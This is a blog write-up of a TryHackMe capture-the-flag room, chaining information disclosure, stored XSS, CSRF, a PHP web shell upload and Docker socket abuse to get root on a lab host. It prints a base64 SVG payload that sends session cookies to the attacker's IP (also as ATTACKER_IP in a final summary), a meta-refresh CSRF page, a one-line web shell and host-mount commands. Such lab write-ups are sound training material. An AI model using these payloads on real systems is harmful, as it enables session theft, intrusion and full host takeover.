@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Sequence | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — Nmap recon, information disclosure via exposed mail dump, stored XSS with base64-encoded SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, PHP web shell upload, and Docker socket abuse for host root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/sequence.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/sequence.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Sequence">
+<meta property="og:description" content="TryHackMe CTF — Stored XSS with base64 SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, and Docker socket abuse for host root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sequence">
+<meta name="twitter:description" content="TryHackMe CTF — Stored XSS with base64 SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, and Docker socket abuse for host root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Sequence</h1>
+    <div class="post-description">TryHackMe CTF. Five sequential vulnerabilities chained from recon to root: information disclosure, stored XSS, CSRF, privilege escalation, and Docker socket abuse.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Recon first. Added <code>review.thm</code> to <code>/etc/hosts</code> and fired off an initial scan.</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.146.146.196</code></pre>
+
+<p>Port 22 and Port 80 are open. The <code>http-enum</code> reveals directories: <code>/login.php</code>, <code>/mail/</code>, <code>/phpmyadmin/</code>, and <code>/uploads/</code>. The scan also flagged <code>PHPSESSID: httponly flag not set</code> on Port 80.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 6.11.12 AM.png" alt="nmap vuln scan showing open ports and http-enum results" style="max-width:100%;margin:2rem 0;">
+
+<p>Let&rsquo;s fuzz and see what else is lurking.</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ ffuf -u http://review.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 7.14.59 AM.png" alt="ffuf directory fuzzing results" style="max-width:100%;margin:2rem 0;">
+
+<p>While that runs, let&rsquo;s pay <code>review.thm</code> a visit.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 6.16.56 AM.png" alt="review.thm homepage in browser" style="max-width:100%;margin:2rem 0;">
+
+<p>Ahh. So this is where companies buy fake reviews.</p>
+
+<hr>
+
+<h2>Information Disclosure</h2>
+
+<p>Let&rsquo;s look at the <code>/mail</code> subdomain the scan found.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 6.28.16 AM.png" alt="mail subdomain showing inbox" style="max-width:100%;margin:2rem 0;">
+
+<p>Well hello there.<br>
+Mind if I slide into your DMs?<br>
+Yes? Too bad&hellip;</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 6.30.03 AM.png" alt="mail contents showing credentials and internal URLs" style="max-width:100%;margin:2rem 0;">
+
+<p>Bingo. I truly cannot thank you enough, Robert. I might get some sun today.</p>
+
+<p>From Mr. Robert, we now know:</p>
+<ul>
+<li><code>http://review.thm/mail/dump.txt</code> exists</li>
+<li>Internal email addresses: <code>software@review.thm</code> and <code>product@review.thm</code></li>
+<li><code>/finance.php</code> exists on an internal private <code>192.x</code> network</li>
+<li><code>/lottery.php</code> lives on the same network</li>
+<li>The password, all 8 characters of it (no special characters, Robert? Really?): <code>S60u}f5j</code></li>
+</ul>
+
+<p>The dev team lead posts credentials, backend domains, and newly created <code>.php</code> panels in a mail folder. He is now on holiday. He is not watching. He is likely on an island with no MFA/2FA within reach, and likely did not set it up anyways.</p>
+
+<p>Shame on you, Robert.</p>
+
+<hr>
+
+<h2>Stored XSS</h2>
+
+<p>Back to <code>review.thm</code>. The site accepts user-submitted reviews, the <code>httponly</code> flag is not set on <code>PHPSESSID</code>, and we are running on <code>Apache 2.4.41</code>. That combination means JavaScript can tango with session cookies, which sets a volatile stage for an XSS attack.</p>
+
+<p>Let&rsquo;s look at both <code>Contact Us</code>&hellip;</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 6.44.35 AM.png" alt="Contact Us form on review.thm" style="max-width:100%;margin:2rem 0;">
+
+<p>&hellip;and <code>login.php</code>:</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 6.45.10 AM.png" alt="login.php form on review.thm" style="max-width:100%;margin:2rem 0;">
+
+<p>Look at how large these form boxes are. Large enough to see the entire payload syntax.<br>
+Thanks, Robert.</p>
+
+<p>The name of this challenge, Sequence, suggests filtered or sequential XSS payload input. Following best practice, a baseline <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> goes in first for fingerprinting. Shoutout to my potential future employers/team members out there. Just letting you know I typically follow TTPs.</p>
+
+<p>Given the room name, the <code>svg onload</code> approach gets our first attempt. Set up a listener on Port 4444:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ nc -lvnp 4444</code></pre>
+
+<p>Test payload:</p>
+
+<pre><code>fetch('http://192.168.128.19:4444/?c='+document.cookie)</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 7.52.47 AM.png" alt="XSS test payload entered in review form" style="max-width:100%;margin:2rem 0;">
+
+<p>Fire away!</p>
+
+<p>Nope. Just kidding. As-expected, the payload needs base64 encoding. Since the browser will not natively decode base64, we handle it client-side with <code>atob()</code>.</p>
+
+<pre><code>echo -n "fetch('http://192.168.128.19:4444/?c='+document.cookie)" | base64</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 7.53.44 AM.png" alt="base64 encoding of the XSS fetch payload" style="max-width:100%;margin:2rem 0;">
+
+<p>Crafted payload:</p>
+
+<pre><code>&lt;svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjEyOC4xOTo0NDQ0Lz9jPScrZG9jdW1lbnQuY29va2llKQ=='))"&gt;</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 7.56.04 AM.png" alt="SVG onload payload submitted to review form" style="max-width:100%;margin:2rem 0;">
+
+<p>Fire again!</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 7.56.38 AM.png" alt="netcat listener receiving stolen session cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>Hah! Gotcha.</p>
+
+<p>Open DevTools, and swap cookies (why does that sound so wrong?).</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 7.59.34 AM.png" alt="DevTools cookie replacement with stolen session cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>The cookie is swapped. Ugh. That sounds even worse.</p>
+
+<p>Refresh the page.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.00.37 AM.png" alt="page refreshed after cookie swap revealing mod dashboard" style="max-width:100%;margin:2rem 0;">
+
+<p>Flag AND mod. Don&rsquo;t mind if I do.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.01.49 AM.png" alt="XSS flag captured" style="max-width:100%;margin:2rem 0;">
+
+<p>We are far from done. We have climbed a bit higher up the chain, but we are just getting started.</p>
+
+<hr>
+
+<h2>CSRF</h2>
+
+<p>Now that we are mod, there are new subdomains to explore. The <code>/Chat</code> is reminiscent of a recent exploit where a logic flaw caused admin to auto-click and visit every new message. Admin visits any URL sent to the chat. That means we are moving on to CSRF.</p>
+
+<p>First, let&rsquo;s look at the other pages we have access to as mod.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.11.12 AM.png" alt="mod dashboard showing available pages including Settings and Chat" style="max-width:100%;margin:2rem 0;">
+
+<p>On <code>Settings.php</code>: Promote to Admin? It cannot be that easy.</p>
+
+<p>Fire up Burp.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.13.37 AM.png" alt="Burp Suite with intercept enabled on Settings.php" style="max-width:100%;margin:2rem 0;">
+
+<p><code>mod</code> goes into the &ldquo;Promote Co-Admin&rdquo; form box, Burp open, FoxyProxy enabled, Intercept on. Grabbed the GET request:</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.15.11 AM.png" alt="Burp intercepted GET request showing CSRF_token_promote parameter" style="max-width:100%;margin:2rem 0;">
+
+<p><code>CSRF_token_promote</code> followed by a token that looks like MD5.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.17.11 AM.png" alt="CSRF token value highlighted in Burp request" style="max-width:100%;margin:2rem 0;">
+
+<p>Let&rsquo;s verify and figure out how to use this.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.22.44 AM.png" alt="Crackstation cracking the MD5 CSRF token to reveal username" style="max-width:100%;margin:2rem 0;">
+
+<p>On Crackstation.net: What the *%#)*</p>
+
+<p>The <code>CSRF_token_promote</code> MD5 hash cracks to my username. That is, put as nicely as I can, bad cyber hygiene. Forget cyber posture. This is cyber-spineless.</p>
+
+<p>If my logic is not flawed (see what I did there?), MD5-encoding <code>admin</code> should get us there.</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ echo -n "admin" | md5sum</code></pre>
+
+<p><code>21232f297a57a5a743894a0e4a801fc3</code> = <code>admin</code> with a lowercase &ldquo;a.&rdquo;</p>
+
+<p>Crafted CSRF payload:</p>
+
+<pre><code>&lt;img src="http://review.thm/promote_coadmin.php?username=admin&amp;csrf_token_promote=21232f297a57a5a743894a0e4a801fc3"&gt;</code></pre>
+
+<p>Ready, set, fire!</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.49.16 AM.png" alt="chat blocking the img payload with a warning modal" style="max-width:100%;margin:2rem 0;">
+
+<p>The chat threw a warning modal and blocked the payload. Big find, though. Decoded, this tells us what keywords the chat blocks:</p>
+
+<pre><code>"onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"</code></pre>
+
+<p>What the chat still allows: <code>img</code>, <code>src</code>, <code>&lt;</code> and <code>&gt;</code>. The payload should survive. Switching from the netcat listener to a Python HTTP server on Port 8000 now. First, confirm the bot is actually clicking links:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ python3 -m http.server 8000</code></pre>
+
+<p>Send to chat:</p>
+
+<pre><code>&lt;img src="http://192.168.128.19:8000/test"&gt;</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 8.58.40 AM.png" alt="Python HTTP server showing admin bot request hitting the test URL" style="max-width:100%;margin:2rem 0;">
+
+<p>The connection hit the Python server. Admin&rsquo;s browser is rendering images.</p>
+
+<p><code>GET /test%22%3E</code> is URL-encoded for <code>/test"&gt;</code>, meaning the browser included the closing <code>"&gt;</code> of the <code>&lt;img&gt;</code> tag as part of the URL. Not parsed as HTML. The chat strips or escapes tags before rendering, and fetches the URL to generate a link preview.</p>
+
+<p>That means we need a plain URL instead. Strip the full <code>href</code> tag, swap <code>username=admin</code> to <code>username=mod</code> since that is what the original GET showed:</p>
+
+<pre><code>http://review.thm/promote_coadmin.php?username=mod&amp;csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 6.33.51 AM.png" alt="plain URL sent to chat for CSRF promotion attempt" style="max-width:100%;margin:2rem 0;">
+
+<p>The message sends, but the listener and privilege level stay static. Clicking &ldquo;View Feedback&rdquo; in the nav reveals something useful:</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 2.55.28 PM.png" alt="nav revealing admin_view.php under View Feedback" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/admin_view.php</code> lives under &ldquo;View Feedback.&rdquo; Filed away.</p>
+
+<p>The bot is grabbing non-payload links. Filters are heavy. Time for a meta refresh redirect. Create a file that silently redirects anyone who visits it straight to the promote endpoint:</p>
+
+<pre><code>cat &gt; ~/www/promote.html &lt;&lt; 'EOF'
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv="refresh" content="0;url=http://review.thm/promote_coadmin.php?username=mod&amp;csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5"&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;/body&gt;
+&lt;/html&gt;
+EOF</code></pre>
+
+<p>Admin bot visits the page, gets instantly redirected to the promote endpoint, and executes the privilege escalation while authenticated as admin.</p>
+
+<p>Send this to the chat:</p>
+
+<pre><code>http://192.168.128.19:8000/promote.html</code></pre>
+
+<p>After sending, head to Settings and change mod&rsquo;s password for viva la persistance.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.22.48 PM.png" alt="Settings.php showing password change form" style="max-width:100%;margin:2rem 0;">
+
+<p>Log out, log back in with the new password.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.24.09 PM.png" alt="logging back in successfully with the new password" style="max-width:100%;margin:2rem 0;">
+
+<p>Muahahahaha.</p>
+
+<p>Mod = PWNED.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.25.28 PM.png" alt="CSRF flag captured" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Privilege Escalation to Admin</h2>
+
+<p>Reload <code>/promote_coadmin.php</code>:</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.31.00 PM.png" alt="promote_coadmin.php showing admin promotion panel now accessible" style="max-width:100%;margin:2rem 0;">
+
+<p>I like this. I like it a lot.</p>
+
+<p>And remember the credentials from <code>/mail/dump.txt</code>? We are about to need them.</p>
+
+<p>Mod&rsquo;s <code>/dashboard.php</code> has a dropdown feature select with <code>/lottery</code>.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.41.21 PM.png" alt="dashboard.php showing dropdown with lottery feature option" style="max-width:100%;margin:2rem 0;">
+
+<p>Lottery says &ldquo;Coming Soon!&rdquo;, but we stay on <code>/dashboard.php</code>.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.42.57 PM.png" alt="lottery Coming Soon page while staying on dashboard" style="max-width:100%;margin:2rem 0;">
+
+<p>Burp that request.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 3.45.16 PM.png" alt="Burp intercepting the dashboard POST request showing feature parameter" style="max-width:100%;margin:2rem 0;">
+
+<p>It is a POST request. We have login credentials for <code>/finance</code>, built by the same dev, both &ldquo;placed in a controlled environment to prevent unauthorized access.&rdquo; Let&rsquo;s swap <code>lottery.php</code> for <code>finance.php</code> in the intercepted request.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 4.05.08 PM.png" alt="Burp request modified to use finance.php instead of lottery.php" style="max-width:100%;margin:2rem 0;">
+
+<p>Hit Forward, kill Intercept.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 4.06.41 PM.png" alt="finance.php login page loaded via Burp forward" style="max-width:100%;margin:2rem 0;">
+
+<p>Disable FoxyProxy, but leave Burp open. We are not done with her yet.</p>
+
+<p>Enter Robert&rsquo;s password:</p>
+
+<img src="/images/sequence/Screenshot 2026-05-15 at 4.08.53 PM.png" alt="finance panel file upload interface after login with Robert's credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>We are now in the Finance feature. Specifically: a file upload feature. On a <code>.php</code> site. If that is not exciting, I cannot help you.</p>
+
+<hr>
+
+<h2>Shell Upload and Docker Socket Abuse</h2>
+
+<p>Make a web shell:</p>
+
+<pre><code>echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; /tmp/shell.php</code></pre>
+
+<p>Start an HTTP server:</p>
+
+<pre><code>python3 -m http.server 80 --directory ~/www</code></pre>
+
+<p>Upload <code>shell.php</code> via the finance panel.</p>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 7.15.53 AM.png" alt="shell.php uploaded via the finance panel" style="max-width:100%;margin:2rem 0;">
+
+<p>Back to Burp. Grab a fresh <code>PHPSESSID</code> in-browser, then send this POST to the Repeater:</p>
+
+<pre><code>POST /dashboard.php HTTP/1.1
+Host: review.thm
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=67a2a5v12r4liujus6vv2o5lds
+Content-Length: 25
+
+feature=uploads/shell.php</code></pre>
+
+<p>Start a listener in a new terminal:</p>
+
+<pre><code>nc -lvnp 443</code></pre>
+
+<p>Send the POST from Repeater and check the listener:</p>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 8.09.34 AM.png" alt="reverse shell received on netcat listener port 443" style="max-width:100%;margin:2rem 0;">
+
+<p>BAM. Docker socket abuse time.</p>
+
+<pre><code>ls -la /var/run/docker.sock</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 8.11.33 AM.png" alt="docker.sock file listing showing group-writable permissions" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>docker images</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 8.13.05 AM.png" alt="docker images listing available images on the host" style="max-width:100%;margin:2rem 0;">
+
+<p>Mount the host filesystem:</p>
+
+<pre><code>docker run -v /:/mnt --rm -it php:8.1-cli bash</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 8.14.05 AM.png" alt="docker run mounting host root filesystem into container at /mnt" style="max-width:100%;margin:2rem 0;">
+
+<p>ROOT, baby.</p>
+
+<p>Docker sockets give us the power to run any container with any mounts. We mounted the host&rsquo;s <code>/</code> into the new container at <code>/mnt</code>. The host&rsquo;s <code>/root/</code> is now at <code>/mnt/root/</code> inside our shell.</p>
+
+<pre><code>cat /mnt/root/flag.txt</code></pre>
+
+<img src="/images/sequence/Screenshot 2026-05-16 at 8.16.14 AM.png" alt="root flag captured via Docker socket abuse" style="max-width:100%;margin:2rem 0;">
+
+<p>Good work, team.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code># Recon
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.146.146.196
+ffuf -u http://review.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+# Info disclosure
+curl http://review.thm/mail/dump.txt
+
+# Stored XSS -- base64 encode payload
+echo -n "fetch('http://ATTACKER_IP:4444/?c='+document.cookie)" | base64
+# Inject via review form:
+# &lt;svg onload="eval(atob('BASE64_STRING'))"&gt;
+
+# Listener for cookie capture
+nc -lvnp 4444
+
+# CSRF token -- MD5 of target username
+echo -n "admin" | md5sum
+# Result: 21232f297a57a5a743894a0e4a801fc3
+
+# Meta refresh CSRF redirect
+cat &gt; ~/www/promote.html &lt;&lt; 'EOF'
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv="refresh" content="0;url=http://review.thm/promote_coadmin.php?username=mod&amp;csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5"&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;/body&gt;
+&lt;/html&gt;
+EOF
+
+# HTTP server for redirect delivery
+python3 -m http.server 8000
+
+# Web shell
+echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; /tmp/shell.php
+# Upload via finance panel, trigger via Burp POST:
+# POST /dashboard.php
+# feature=uploads/shell.php
+
+# Docker socket abuse to host root
+ls -la /var/run/docker.sock
+docker images
+docker run -v /:/mnt --rm -it php:8.1-cli bash
+cat /mnt/root/flag.txt</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
